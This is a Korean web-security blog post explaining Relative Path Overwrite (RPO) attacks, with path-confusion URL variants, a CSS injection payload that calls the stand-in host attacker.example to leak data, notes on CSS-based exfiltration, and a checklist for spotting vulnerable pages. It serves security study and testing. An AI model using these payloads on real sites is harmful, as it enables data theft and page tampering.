---
title: "상대 경로 덮어쓰기 (RPO)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Client]
tags: [rpo, relative-path, css-injection, web]
description: "상대 경로 리소스와 URL 재작성·경로 혼동을 엮어 엉뚱한 응답을 스타일/스크립트로 로드하게 만드는 상대 경로 덮어쓰기(RPO)의 개념과 구문을 정리합니다."
mermaid: true
---

> RPO(Relative Path Overwrite)는 페이지가 **상대 경로**로 CSS·JS를 불러올 때, URL을 조작해 브라우저가 기준 경로를 잘못 잡게 만들어 **엉뚱한 응답을 스타일/스크립트로 로드**시키는 기법이다.

## 개념

`<link href="style.css">`처럼 상대 경로를 쓰면, 브라우저는 현재 문서 URL을 기준으로 경로를 합친다. 서버가 `/page/extra`를 `/page`와 같게 처리(path info 무시)하면서 브라우저는 기준 경로를 `/page/`로 잡으면, `style.css`가 `/page/style.css`로 요청된다. 그 경로가 사용자 입력을 반영하는 응답(예: 404 페이지가 URL을 에코)이면, 공격자가 그 응답에 CSS 문법을 심어 스타일로 해석시킨다.

```
정상: /app/  →  style.css = /app/style.css
RPO:  /app/x%2f..%2f...  →  브라우저 기준 경로가 바뀌어 엉뚱한 응답을 CSS로 로드
```

## 공격·우회 구문

허가된 범위에서만.

### 기준 경로 혼동 유발

```
/page/..%2f               경로 세그먼트를 추가해 브라우저 기준 경로 이동
/page/;extra  /  /page/%2e
서버가 같은 페이지를 주지만(path info 무시) 브라우저는 다른 기준으로 상대경로 계산
→ style.css 요청이 '입력 반영 응답' 쪽으로 향하게
```

### 반영 응답에 CSS 주입

```
입력을 에코하는 응답(404·검색)에 CSS 문법 삽입:
  {}body{background:url(//attacker.example/leak)}
  CSS 로더가 그 응답을 스타일시트로 해석 → 속성값 유출·UI 변조
스크립트가 상대경로이고 응답이 JS로 해석되면 더 심각(실행)
```

### CSS 기반 데이터 유출 결합

```
주입된 CSS 로 속성 선택자 + background url 로 토큰·값 추론(→ XS-Search/CSS exfiltration)
```

### 확인 요령

```
페이지가 상대경로로 CSS/JS 를 로드하는지, <base> 태그가 없는지
경로 세그먼트 추가 시 같은 페이지를 주면서 상대경로 기준이 바뀌는지
입력을 반영하는 응답이 text/css 등으로 해석될 수 있는지
```

## 참고 자료

- [OWASP: Relative Path Overwrite](https://owasp.org/www-community/attacks/Relative_Path_Overwrite)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
